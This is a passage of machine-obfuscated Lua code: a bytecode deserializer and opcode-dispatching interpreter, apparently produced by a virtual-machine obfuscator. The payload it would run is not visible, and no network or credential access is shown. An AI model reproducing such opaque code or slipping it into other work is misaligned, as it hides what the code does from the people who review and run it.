bw),ca,cc))end,function(y,bf,bh,bi)if(cw>be)then local be=cv while true do be=be+ct if be<cs then return bi else break end end end cw=cw+ct cx=((cx+x)%w)if((cx%s)>v or(cx%s)==v)then local s=cv while true do s=(s+ct)if(s<ct or s==ct)then cx=((cx-bz)%q)else if not(s~=bg)then break else return bi end end end else local q=cv while true do q=(q+ct)if not(q~=cs)then break else return bh(y(bh,(y and bh),bf,bi),(bi(bh,y,bf,bh)and bf(bi,bi and bh,bf,bh and bi)),bh(bf,bh,y,bh),bf(bf,bi,bf,bf))end end end return y(bh(bf and bi,bf,bf and y,(bi and bh)),bi(y,bh,bi,bh),bi(bi and bh,(bh and bh),bf,bh),y(bh,bi,bf,bi))end,function(q,s,v,w)if cw>p then local p=cv while true do p=p+ct if p<cs then return w else break end end end cw=cw+ct cx=(cx*d)%c if((cx%b)>a)then local a=cv while true do a=a+ct if(a<cs)then return q(v(w,q,q,(s and v)),q(q,v,s,(s and q))and w(s,w,w,s),s(q,w,q,(v and q)),v(q,v,q,v)and q(s,v,q,(q and w)))else break end end else local a=cv while true do a=a+ct if not(a~=cs)then break else return s end end end return w end)return cx;end)()));else ck=function()local a,b,c,d,p,q,s=0 while true do if a<=3 then if a<=1 then if 1>a then b,c=cf(),cf()else if b==0 and c==0 then return 0;end;end else if 2<a then p=(cd(c,1,20)*((2^32)))+b else d=1 end end else if a<=5 then if a~=5 then q=cd(c,21,31)else s=(((-1)^cd(c,32)))end else if a<=6 then if(q==0)then if(not(p~=0))then return s*0;else q=1;d=0;end;elseif(not(q~=2047))then if(p==0)then return(s*((1/0)));else return(s*(0/0));end;end;else if a>7 then break else return s*2^(q-1023)*(d+(p/(2^52)))end end end end a=a+1 end end end else if bd<=29 then cl="\46"else if bd==30 then cm=function()local a,b,c=0 while true do if a<=1 then if 1>a then b,c=h(bn,br,(br+2))else b,c=bu(b,cb),bu(c,cb);end else if a<=2 then br=br+2;else if 4>a then return((bv(c,8))+b);else break end end end a=a+1 end end else cn=cf end end end else if bd<=33 then if 33~=bd then co=function()local a,b,c,d,p=0 while true do if a<=2 then if a<=0 then b=g else if 2>a then c=157 else d=0 end end else if a<=3 then p={}else if 5~=a then while d<8 do d=(d+1);while((d<707)and(c%1622<811))do c=(((c*35)))local q=d+c if(((c%16522)<8261))then c=((c*19))while(((d<828)and c%658<329))do c=((c+60))local q=d+c if(not(((c%18428))~=9214)or(((c%18428))<9214))then c=((c-50))local q=10701 if not p[q]then p[q]=1;local q,s=cn(),g;if not(q~=0)then return g;end;b=j(bn,br,(br+q-1));br=((br+q));return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s<2 then while true do if 0<v then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end elseif(not((c%4)==0))then c=((c-67))local q=33140 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s>1 then break else while true do if not(v==1)then return i(h(q))else break end v=v+1 end end end s=s+1 end end);end else c=((c*88))d=d+1 local q=92657 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s~=2 then while true do if(1>v)then return i(h(q))else break end v=v+1 end else break end end s=s+1 end end);end end;d=(d+1);end elseif not(not((c%4)~=0))then c=((c-48))while(((d<859))and c%1392<696)do c=(c*39)local q=((d+c))if(c%58)<29 then c=(((c+5)))local q=33930 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s<2 then while true do if(v>0)then break else return i(h(q))end v=(v+1)end else break end end s=s+1 end end);end elseif not(not(c%4~=0))then c=((c*56))local q=35370 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s>1 then break else while true do if(v>0)then break else return i(h(q))end v=v+1 end end end s=s+1 end end);end else c=((c*9))d=(d+1)local q=96267 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s~=2 then while true do if 1~=v then return i(h(q))else break end v=(v+1)end else break end end s=s+1 end end);end end;d=d+1;end else c=(((c-51)))d=(d+1)while((d<663)and((c%936)<468))do c=(((c*12)))local q=((d+c))if(((c%18532)>=9266))then c=((c*71))local q=7037 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s==1 then while true do if v>0 then break else return i(h(q))end v=(v+1)end else break end end s=s+1 end end);end elseif not(not(c%4~=0))then c=(c-18)local q=90882 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s>1 then break else while true do if not(1==v)then return i(h(q))else break end v=(v+1)end end end s=s+1 end end);end else c=((c*35))d=((d+1))local q=41573 if not p[q]then p[q]=1;return z(b,cl,function(b)local p,q=0 while true do if p<=0 then q=0 else if p==1 then while true do if(q==0)then return i(h(b))else break end q=(q+1)end else break end end p=p+1 end end);end end;d=(d+1);end end;d=(d+1);end c=((c-494))if(d>43)then break;end;end;else break end end end a=a+1 end end else cp=cf end else if bd<=34 then cq=function(...)local a=0 while true do if a==0 then return{...},n("\35",...)else break end a=a+1 end end else if bd==35 then cr=function()local a,b,c,d,p,q,s,v,w,x=0 while true do if a<=9 then if a<=4 then if a<=1 then if a~=1 then b,c,d,p={},{},{},{}else q=m({[ch]=b,nil,[ci]=c,nil,[776]=p,[345]=bb,[536]=nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return j(bn,br,br);end,})end else if a<=2 then s={}else if a~=4 then v=490 else w=0 end end end else if a<=6 then if 5==a then x={}else while(w<3)do w=(w+1);while((w<481 and v%320<160))do v=((v*62))local d=w+v if(v%916)>458 then v=(((v-88)))while(w<318)and(v%702<351)do v=((v*8))local d=((w+v))if(v%14064)>7032 then v=(v*81)local d=58084 if not x[d]then x[d]=1;s[cf()]=nil;end elseif v%4~=0 then v=((v*37))local d=93269 if not x[d]then x[d]=1;s[cf()]=nil;end else v=((v+10))w=((w+1))local d=78058 if not x[d]then x[d]=1;for d=1,cf()do local j=cg();if(not(j~=3))then s[d]=nil;elseif(not((j~=1)))then s[d]=(not(not(cg()~=0)));elseif((j==0))then s[d]=ck();elseif(not(j~=2))then s[d]=co();end;end;q[cj]=s;end end;w=w+1;end elseif not(not(((v%4))~=0))then v=(((v*65)))while w<615 and v%618<309 do v=((v-33))local d=w+v if(((v%15582))>7791)then v=((v*14))local d=31092 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not(not(v%4~=0))then v=(((v+51)))local d=68285 if not x[d]then x[d]=1;s[cf()]=nil;end else v=(((v+53)))w=(w+1)local d=64266 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=((w+1));end else v=((v+7))w=w+1 while(w<127 and v%1548<774)do v=((v-37))local d=((w+v))if(((v%19188)>9594))then v=((v*61))local d=73351 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not((v%4==0))then v=(v+25)local d=78934 if not x[d]then x[d]=1;s[cf()]=nil;end else v=((v+42))w=((w+1))local d=62692 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=(w+1);end end;w=(w+1);end v=(v*482)if(w>56)then break;end;end;end else if a<=7 then for d=1,cf()do c[(d-1)]=cr();end;else if 9~=a then q[481]=cg();else v=862 end end end end else if a<=14 then if a<=11 then if 11>a then w=0 else x={}end else if a<=12 then while(w<4)do w=w+1;while((w<400 and v%1706<853))do v=(v*84)local c=w+v if((((v%9240))>4620))then v=((v+14))while(((w<262)and v%1482<741))do v=(((v+94)))local c=(w+v)if(v%16314)<8157 then v=(((v*71)))local c=96356 if not x[c]then x[c]=1;end elseif not((v%4)==0)then v=(v*16)local c=25138 if not x[c]then x[c]=1;end else v=(((v-74)))w=((w+1))local c=55335 if not x[c]then x[c]=1;end end;w=w+1;end elseif not(not((v%4)~=0))then v=(((v-74)))while((w<902)and v%1822<911)do v=(((v+58)))local c=(w+v)if(v%18182)<=9091 then v=(((v-13)))local c=75927 if not x[c]then x[c]=1;end elseif(not(v%4==0))then v=(((v+79)))local c=2136 if not x[c]then x[c]=1;end else v=(((v*8)))w=w+1 local c=77807 if not x[c]then x[c]=1;end end;w=(w+1);end else v=((v*57))w=(w+1)while w<184 and v%570<285 do v=(v-83)local c=((w+v))if((v%16042)>8021)then v=(((v-19)))local c=69885 if not x[c]then x[c]=1;end elseif(v%4~=0)then v=(((v*47)))local c=690 if not x[c]then x[c]=1;local c=1;local d=2;local j=3;local p=4;for p=1,cf()do local y=cg();local bb=cd(y,c,c);if(((not(bb~=0))))then local y,bb,be=cd(y,d,j),cd(y,4,6),m({[680]=cm(),[94]=cm(),nil,nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return cd(y,d,j);end,})if(((y==0)or(y==c)))then be[63]=cf();if((not(y~=0)))then be[758]=cf();end;elseif(((not(y~=d))or((y==j))))then be[63]=(cf()-(e));if(not(not(not(y~=j))))then be[758]=cm();end;end;if(not(not((cd(bb,c,c)==c))))then be[94]=s[be[94]];end;if(((cd(bb,d,d)==c)))then be[63]=s[be[63]];end;if(not(cd(bb,j,j)~=c))then be[758]=s[be[758]];end;b[p]=be;end;end;end else v=((v*22))w=(w+1)local b=84538 if not x[b]then x[b]=1;end end;w=(w+1);end end;w=(w+1);end v=(v+834)if w>15 then break;end;end;else if a==13 then do for b=1,#q[ch]do local b=q[ch][b]local c,d,e=b[94],b[63],b[758]if not(((bp(c)~=f)))then c=z(c,cl,function(j,p,p,p)local p,s=0 while true do if p<=0 then s=0 else if 1==p then while true do if not(0~=s)then return i(bu(h(j),cb))else break end s=s+1 end else break end end p=p+1 end end)b[94]=c end if not(not(bp(d)==f))then d=z(d,cl,function(c,j,j,j)local j,p=0 while true do if j<=0 then p=0 else if j==1 then while true do if(p~=1)then return i(bu(h(c),cb))else break end p=p+1 end else break end end j=j+1 end end)b[63]=d end if not(bp(e)~=f)then e=z(e,cl,function(c,d,d,d)local d,j=0 while true do if d<=0 then j=0 else if d~=2 then while true do if 0==j then return i(bu(h(c),cb))else break end j=j+1 end else break end end d=d+1 end end)b[758]=e end;end;q[cj]=nil;end;else v=957 end end end else if a<=16 then if a==15 then w=0 else x={}end else if a<=17 then while w<9 do w=w+1;while((w<880)and v%1916<958)do v=((v-34))local b=(w+v)if((((v%13122))<6561 or((v%13122))==6561))then v=(((v+39)))while(w<813 and(v%254)<127)do v=(((v*35)))local b=w+v if((v%11020)<5510)then v=(v+32)local b=16509 if not x[b]then x[b]=1;q[536]=function(...)local b,c,d,e,h=0 while true do if b<=0 then c,d,e,h=0 else if b>1 then break else while true do if(c<=2)then if(c<=0)then d=n(1,...)else if c~=2 then e=({...})else do for d=0,#e do if not((bp(e[d])~=bq))then for i,i in o,e[d]do if not(not(bp(i)==bp(g)))then t(bo,i)end end else t(bo,e[d])end end end end end else if(c<3 or c==3)then h=function(d)local i,j,p=0 while true do if i<=0 then j,p=0 else if i==1 then while true do if j<=1 then if not(j==1)then p=u(d)else for p=0,#bo do if ba(d,bo[p])then return bm(f);end end end else if(j<3)then return false else break end end j=j+1 end else break end end i=i+1 end end else if(4<c)then break else for d=0,#e do if(not(bp(e[d])~=bq))then return h(e[d])end end end end end c=c+1 end end end b=b+1 end end end elseif not(((v%4)==0))then v=((v*81))local b=71037 if not x[b]then x[b]=1;return q end else v=((v+61))w=(w+1)local b=66380 if not x[b]then x[b]=1;end end;w=w+1;end elseif not((v%4)==0)then v=((v-9))while(w<575 and v%532<266)do v=(((v+42)))local b=((w+v))if(((v%17678)<=8839))then v=(((v-13)))local b=93889 if not x[b]then x[b]=1;return q end elseif not(((v%4)==0))then v=(v-68)local b=74531 if not x[b]then x[b]=1;return q end else v=(v*4)w=(w+1)local b=6405 if not x[b]then x[b]=1;return q end end;w=(w+1);end else v=((v-55))w=w+1 while(w<365 and v%1038<519)do v=((v*1))local b=(w+v)if(((v%18320)>9160))then v=(((v-89)))local b=25934 if not x[b]then x[b]=1;return q end elseif not((v%4)==0)then v=((v-21))local b=79078 if not x[b]then x[b]=1;return q end else v=(v+1)w=(w+1)local b=62087 if not x[b]then x[b]=1;return q end end;w=((w+1));end end;w=w+1;end v=(((v+638)))if(w>70)then break;end;end;else if a<19 then return q;else break end end end end end a=a+1 end end else break end end end end end end bd=bd+1 end local function a(b,c)local d if bp(l)==bq then d=l;else d=l(bl);end local e={}for f,h in o,d do if h~=b then e[f]=h else e[f]=c;end end if bc then return bc(bl,e)else l=e;return l;end end;local function b(...)local c=n(bl,...);local d=c[ci];local e=c[536];local f=c[ch];local h=n(2,...);local i=c[345];local j=n(3,...);local o=c[481];local c=c[776];local c=bt[ba(bx,i)];return function(...)local i,n,p,q,s,u,v,w=cq,1,-1,{},{...},(n("\35",...)-1),{},{};for x=0,u,1 do if(x>=o)then q[x-o]=s[x+1];else w[x]=s[x+1];end;end;local x,y,z,ba=(u-o+1),nil,nil,{};while true do y=f[n];z=y[680];if z<=185 then if 92>=z then if z<=45 then if(22>=z)then if(z==10 or z<10)then if(z<4 or z==4)then if(1>=z)then if(z>0)then local ba,bb,bc=0 while true do if ba<=13 then if ba<=6 then if ba<=2 then if ba<=0 then bb=nil else if ba>1 then w[y[94]]=y[63];else bc=nil end end else if ba<=4 then if ba>3 then y=f[n];else n=n+1;end else if 6>ba then w[y[94]]=w[y[63]][w[y[758]]];else n=n+1;end end end else if ba<=9 then if ba<=7 then y=f[n];else if 9~=ba then w[y[94]]=j[y[63]];else n=n+1;end end else if ba<=11 then if 11~=ba then y=f[n];else w[y[94]]=y[63];end else if 12==ba then n=n+1;else y=f[n];end end end end else if ba<=20 then if ba<=16 then if ba<=14 then w[y[94]]=w[y[63]][w[y[758]]];else if 15==ba then n=n+1;else y=f[n];end end else if ba<=18 then if 18>ba then w[y[94]]=j[y[63]];else n=n+1;end else if ba<20 then y=f[n];else w[y[94]]=y[63];end end end else if ba<=23 then if ba<=21 then n=n+1;else if 22<ba then bc=y[94];else y=f[n];end end else if ba<=25 then if 24==ba then bb=w[y[63]];else w[bc+1]=bb;end else if ba<27 then w[bc]=bb[w[y[758]]];else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=29 then if ba<=14 then if ba<=6 then if ba<=2 then if ba<=0 then bb=nil else if 2>ba then w[y[94]]={};else n=n+1;end end else if ba<=4 then if 3<ba then w[y[94]]=y[63];else y=f[n];end else if 6~=ba then n=n+1;else y=f[n];end end end else if ba<=10 then if ba<=8 then if ba>7 then n=n+1;else w[y[94]][w[y[63]]]=w[y[758]];end else if ba==9 then y=f[n];else w[y[94]]=y[63];end end else if ba<=12 then if ba==11 then n=n+1;else y=f[n];end else if 13<ba then n=n+1;else w[y[94]][w[y[63]]]=w[y[758]];end end end end else if ba<=21 then if ba<=17 then if ba<=15 then y=f[n];else if ba~=17 then w[y[94]]=y[63];else n=n+1;end end else if ba<=19 then if 19~=ba then y=f[n];else w[y[94]][w[y[63]]]=w[y[758]];end else if 21>ba then n=n+1;else y=f[n];end end end else if ba<=25 then if ba<=23 then if ba~=23 then w[y[94]]=y[63];else n=n+1;end else if 24<ba then w[y[94]][w[y[63]]]=w[y[758]];else y=f[n];end end else if ba<=27 then if ba>26 then y=f[n];else n=n+1;end else if 28<ba then n=n+1;else w[y[94]]=y[63];end end end end end else if ba<=44 then if ba<=36 then if ba<=32 then if ba<=30 then y=f[n];else if 31<ba then n=n+1;else w[y[94]][w[y[63]]]=w[y[758]];end end else if ba<=34 then if ba==33 then y=f[n];else w[y[94]]=y[63];end else if 36>ba then n=n+1;else y=f[n];end end end else if ba<=40 then if ba<=38 then if ba==37 then w[y[94]][w[y[63]]]=w[y[758]];else n=n+1;end else if ba~=40 then y=f[n];else w[y[94]]={};end end else if ba<=42 then if 42~=ba then n=n+1;else y=f[n];end else if 44>ba then w[y[94]]=y[63];else n=n+1;end end end end else if ba<=52 then if ba<=48 then if ba<=46 then if ba<46 then y=f[n];else w[y[94]][w[y[63]]]=w[y[758]];end else if ba==47 then n=n+1;else y=f[n];end end else if ba<=50 then if ba~=50 then w[y[94]]=j[y[63]];else n=n+1;end else if ba~=52 then y=f[n];else w[y[94]]=w[y[63]];end end end else if ba<=56 then if ba<=54 then if 54>ba then n=n+1;else y=f[n];end else if ba<56 then w[y[94]]=w[y[63]];else n=n+1;end end else if ba<=58 then if ba~=58 then y=f[n];else bb=y[94]end else if 60~=ba then w[bb](r(w,bb+1,y[63]))else break end end end end end end ba=ba+1 end end;elseif(z<=2)then if(w[y[94]]~=y[758])then n=y[63];else n=(n+1);end;elseif not(z~=3)then local ba,bb=0 while true do if ba<=12 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if ba>1 then for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;else w={};end end else if ba<=3 then n=n+1;else if 5~=ba then y=f[n];else w[y[94]]=h[y[63]];end end end else if ba<=8 then if ba<=6 then n=n+1;else if 8>ba then y=f[n];else w[y[94]]=j[y[63]];end end else if ba<=10 then if 10~=ba then n=n+1;else y=f[n];end else if 11==ba then w[y[94]]=w[y[63]][y[758]];else n=n+1;end end end end else if ba<=18 then if ba<=15 then if ba<=13 then y=f[n];else if ba<15 then w[y[94]]=y[63];else n=n+1;end end else if ba<=16 then y=f[n];else if 17==ba then w[y[94]]=y[63];else n=n+1;end end end else if ba<=21 then if ba<=19 then y=f[n];else if 21>ba then w[y[94]]=y[63];else n=n+1;end end else if ba<=23 then if ba<23 then y=f[n];else bb=y[94]end else if ba~=25 then w[bb]=w[bb](r(w,bb+1,y[63]))else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 0<ba then w[y[94]]=h[y[63]];else bb=nil end else if 2==ba then n=n+1;else y=f[n];end end else if ba<=5 then if ba==4 then w[y[94]]=w[y[63]][y[758]];else n=n+1;end else if ba<7 then y=f[n];else w[y[94]]=y[63];end end end else if ba<=11 then if ba<=9 then if 9~=ba then n=n+1;else y=f[n];end else if 11~=ba then w[y[94]]=y[63];else n=n+1;end end else if ba<=13 then if ba==12 then y=f[n];else bb=y[94]end else if 15>ba then w[bb]=w[bb](r(w,bb+1,y[63]))else break end end end end ba=ba+1 end end;elseif(7>=z)then if(z<=5)then local ba,bb=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if 1>ba then bb=nil else w[y[94]][y[63]]=w[y[758]];end else if ba<=2 then n=n+1;else if 4~=ba then y=f[n];else w[y[94]]=j[y[63]];end end end else if ba<=7 then if ba<=5 then n=n+1;else if ba>6 then w[y[94]]=w[y[63]][y[758]];else y=f[n];end end else if ba<=8 then n=n+1;else if 10>ba then y=f[n];else w[y[94]]=h[y[63]];end end end end else if ba<=15 then if ba<=12 then if ba>11 then y=f[n];else n=n+1;end else if ba<=13 then w[y[94]]=w[y[63]][y[758]];else if ba<15 then n=n+1;else y=f[n];end end end else if ba<=18 then if ba<=16 then w[y[94]]=w[y[63]];else if 17<ba then y=f[n];else n=n+1;end end else if ba<=19 then bb=y[94]else if ba>20 then break else w[bb](r(w,bb+1,y[63]))end end end end end ba=ba+1 end elseif(6<z)then local ba=y[94];do return w[ba],w[(ba+1)]end else local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 0<ba then bc=nil else bb=nil end else if ba<=2 then bd=nil else if 4>ba then w[y[94]]=h[y[63]];else n=n+1;end end end else if ba<=6 then if 5<ba then w[y[94]]=h[y[63]];else y=f[n];end else if ba<=7 then n=n+1;else if ba==8 then y=f[n];else w[y[94]]=w[y[63]][y[758]];end end end end else if ba<=14 then if ba<=11 then if 11~=ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[94]]=w[y[63]][w[y[758]]];else if ba~=14 then n=n+1;else y=f[n];end end end else if ba<=16 then if 16>ba then bd=y[94]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 19~=ba then for be=bd,y[758]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end end;elseif(8>=z)then local ba=y[94]w[ba](r(w,ba+1,y[63]))elseif z>9 then w[y[94]]=j[y[63]];else w[y[94]][y[63]]=y[758];end;elseif z<=16 then if(13==z or 13>z)then if z<=11 then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba~=1 then bb=nil else w[y[94]]=w[y[63]][w[y[758]]];end else if ba~=3 then n=n+1;else y=f[n];end end else if ba<=5 then if 5>ba then w[y[94]]=w[y[63]];else n=n+1;end else if ba<=6 then y=f[n];else if 7==ba then w[y[94]]=y[63];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if 10>ba then y=f[n];else w[y[94]]=y[63];end else if ba<=11 then n=n+1;else if ba>12 then w[y[94]]=y[63];else y=f[n];end end end else if ba<=15 then if 14<ba then y=f[n];else n=n+1;end else if ba<=16 then bb=y[94]else if 17<ba then break else w[bb]=w[bb](r(w,bb+1,y[63]))end end end end end ba=ba+1 end elseif z<13 then w[y[94]]=w[y[63]];else w[y[94]]=w[y[63]]%w[y[758]];end;elseif(z<=14)then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba<1 then bb=nil else w[y[94]]=w[y[63]][y[758]];end else if ba>2 then y=f[n];else n=n+1;end end else if ba<=5 then if ba==4 then w[y[94]]=w[y[63]][y[758]];else n=n+1;end else if ba<=6 then y=f[n];else if ba==7 then w[y[94]]=w[y[63]][y[758]];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if 10>ba then y=f[n];else w[y[94]]=w[y[63]][y[758]];end else if ba<=11 then n=n+1;else if 12<ba then w[y[94]]=w[y[63]][y[758]];else y=f[n];end end end else if ba<=15 then if 15>ba then n=n+1;else y=f[n];end else if ba<=16 then bb=y[94]else if 18>ba then w[bb]=w[bb](w[bb+1])else break end end end end end ba=ba+1 end elseif 16>z then local ba,bb=0 while true do if ba<=17 then if ba<=8 then if ba<=3 then if ba<=1 then if ba<1 then bb=nil else w={};end else if 3>ba then for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;else n=n+1;end end else if ba<=5 then if ba>4 then w[y[94]]={};else y=f[n];end else if ba<=6 then n=n+1;else if ba>7 then w[y[94]]=h[y[63]];else y=f[n];end end end end else if ba<=12 then if ba<=10 then if 9<ba then y=f[n];else n=n+1;end else if ba~=12 then w[y[94]]=w[y[63]][y[758]];else n=n+1;end end else if ba<=14 then if ba~=14 then y=f[n];else w[y[94]]=h[y[63]];end else if ba<=15 then n=n+1;else if ba<17 then y=f[n];else w[y[94]]=w[y[63]][y[758]];end end end end end else if ba<=26 then if ba<=21 then if ba<=19 then if 19>ba then n=n+1;else y=f[n];end else if ba<21 then w[y[94]]={};else n=n+1;end end else if ba<=23 then if ba==22 then y=f[n];else w[y[94]]=y[63];end else if ba<=24 then n=n+1;else if ba~=26 then y=f[n];else w[y[94]]=y[63];end end end end else if ba<=30 then if ba<=28 then if ba~=28 then n=n+1;else y=f[n];end else if ba<30 then w[y[94]]=y[63];else n=n+1;end end else if ba<=32 then if 31==ba then y=f[n];else bb=y[94];end else if ba<=33 then w[bb]=w[bb]-w[bb+2];else if ba==34 then n=y[63];else break end end end end end end ba=ba+1 end else if w[y[94]]then n=(n+1);else n=y[63];end;end;elseif z<=19 then if(17==z or 17>z)then local ba,bb=0 while true do if(ba<7 or not(ba~=7))then if(ba==3 or ba<3)then if(ba==1 or ba<1)then if 1>ba then bb=nil else w[y[94]]=w[y[63]][y[758]];end else if not(ba~=2)then n=(n+1);else y=f[n];end end else if(ba==5 or ba<5)then if(ba>4)then n=(n+1);else w[y[94]]=y[63];end else if not(not(ba==6))then y=f[n];else w[y[94]]=h[y[63]];end end end else if(ba<11 or ba==11)then if(ba<9 or not(ba~=9))then if(9>ba)then n=(n+1);else y=f[n];end else if(11>ba)then w[y[94]]=w[y[63]][y[758]];else n=n+1;end end else if(not(ba~=13)or ba<13)then if not(not(13~=ba))then y=f[n];else bb=y[94]end else if not(ba==15)then w[bb]=w[bb](r(w,(bb+1),y[63]))else break end end end end ba=ba+1 end elseif(18<z)then local ba,bb,bc,bd=0 while true do if(ba==9 or ba<9)then if(ba==4 or ba<4)then if(ba<1 or ba==1)then if 1>ba then bb=nil else bc=nil end else if(ba<2 or ba==2)then bd=nil else if ba>3 then n=n+1;else w[y[94]]=h[y[63]];end end end else if(ba<=6)then if not(6==ba)then y=f[n];else w[y[94]]=h[y[63]];end else if(ba==7 or ba<7)then n=(n+1);else if(ba~=9)then y=f[n];else w[y[94]]=w[y[63]][y[758]];end end end end else if(ba==14 or ba<14)then if(ba<11 or ba==11)then if ba<11 then n=n+1;else y=f[n];end else if(ba<=12)then w[y[94]]=w[y[63]][w[y[758]]];else if(ba<14)then n=(n+1);else y=f[n];end end end else if(ba<16 or ba==16)then if(ba>15)then bc={w[bd](w[bd+1])};else bd=y[94]end else if ba<=17 then bb=0;else if 19>ba then for be=bd,y[758]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=(ba+1)end else if not w[y[94]]then n=(n+1);else n=y[63];end;end;elseif z<=20 then local ba=y[94];do return w[ba](r(w,ba+1,y[63]))end;elseif z~=22 then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba==0 then bb=nil else w[y[94]][y[63]]=w[y[758]];end else if ba>2 then y=f[n];else n=n+1;end end else if ba<=5 then if ba==4 then w[y[94]]={};else n=n+1;end else if ba==6 then y=f[n];else w[y[94]][y[63]]=y[758];end end end else if ba<=11 then if ba<=9 then if ba~=9 then n=n+1;else y=f[n];end else if 10==ba then w[y[94]][y[63]]=w[y[758]];else n=n+1;end end else if ba<=13 then if ba<13 then y=f[n];else bb=y[94]end else if ba>14 then break else w[bb]=w[bb](r(w,bb+1,y[63]))end end end end ba=ba+1 end else w[y[94]]=y[63];end;elseif(z<33 or z==33)then if(27>z or 27==z)then if z<=24 then if(z~=24)then local ba=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if 0==ba then a(c,e);else n=n+1;end else if ba==2 then y=f[n];else w={};end end else if ba<=5 then if 5~=ba then for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;else n=n+1;end else if ba<=6 then y=f[n];else if 7==ba then w[y[94]]=y[63];else n=n+1;end end end end else if ba<=12 then if ba<=10 then if ba==9 then y=f[n];else w[y[94]]=j[y[63]];end else if 12~=ba then n=n+1;else y=f[n];end end else if ba<=14 then if 13==ba then w[y[94]]=j[y[63]];else n=n+1;end else if ba<=15 then y=f[n];else if ba<17 then w[y[94]]=w[y[63]][y[758]];else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba==0 then bb=nil else w[y[94]]=h[y[63]];end else if ba==2 then n=n+1;else y=f[n];end end else if ba<=5 then if ba>4 then n=n+1;else w[y[94]]=w[y[63]][y[758]];end else if ba<7 then y=f[n];else w[y[94]]=y[63];end end end else if ba<=11 then if ba<=9 then if ba==8 then n=n+1;else y=f[n];end else if ba~=11 then w[y[94]]=y[63];else n=n+1;end end else if ba<=13 then if ba~=13 then y=f[n];else bb=y[94]end else if ba<15 then w[bb]=w[bb](r(w,bb+1,y[63]))else break end end end end ba=ba+1 end end;elseif(25>z or 25==z)then w[y[94]]=w[y[63]][w[y[758]]];elseif 27~=z then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba>0 then bc=nil else bb=nil end else if ba<=2 then bd=nil else if ba>3 then n=n+1;else w[y[94]]=h[y[63]];end end end else if ba<=6 then if 5<ba then w[y[94]]=h[y[63]];else y=f[n];end else if ba<=7 then n=n+1;else if 8<ba then w[y[94]]=w[y[63]][y[758]];else y=f[n];end end end end else if ba<=14 then if ba<=11 then if 11~=ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[94]]=w[y[63]][w[y[758]]];else if ba<14 then n=n+1;else y=f[n];end end end else if ba<=16 then if 16>ba then bd=y[94]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if ba<19 then for be=bd,y[758]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=13 then if ba<=6 then if ba<=2 then if ba<=0 then bb=nil else if 2~=ba then w[y[94]]={};else n=n+1;end end else if ba<=4 then if ba<4 then y=f[n];else w[y[94]]=h[y[63]];end else if 6>ba then n=n+1;else y=f[n];end end end else if ba<=9 then if ba<=7 then w[y[94]]=w[y[63]][y[758]];else if 8==ba then n=n+1;else y=f[n];end end else if ba<=11 then if ba==10 then w[y[94]][y[63]]=w[y[758]];else n=n+1;end else if 12<ba then w[y[94]]=j[y[63]];else y=f[n];end end end end else if ba<=20 then if ba<=16 then if ba<=14 then n=n+1;else if ba>15 then w[y[94]]=w[y[63]][y[758]];else y=f[n];end end else if ba<=18 then if 17<ba then y=f[n];else n=n+1;end else if ba<20 then w[y[94]]=j[y[63]];else n=n+1;end end end else if ba<=23 then if ba<=21 then y=f[n];else if 22==ba then w[y[94]]=w[y[63]][y[758]];else n=n+1;end end else if ba<=25 then if 25~=ba then y=f[n];else bb=y[94]end else if ba==26 then w[bb]=w[bb]()else break end end end end end ba=ba+1 end end;elseif z<=30 then if(28>z or 28==z)then local ba,bb,bc,bd=0 while true do if ba<=15 then if ba<=7 then if ba<=3 then if ba<=1 then if ba~=1 then bb=nil else bc=nil end else if ba>2 then w[y[94]]=h[y[63]];else bd=nil end end else if ba<=5 then if 4==ba then n=n+1;else y=f[n];end else if 6==ba then w[y[94]]=w[y[63]][y[758]];else n=n+1;end end end else if ba<=11 then if ba<=9 then if ba>8 then w[y[94]]=h[y[63]];else y=f[n];end else if ba<11 then n=n+1;else y=f[n];end end else if ba<=13 then if ba<13 then w[y[94]]=w[y[63]][y[758]];else n=n+1;end else if 15~=ba then y=f[n];else 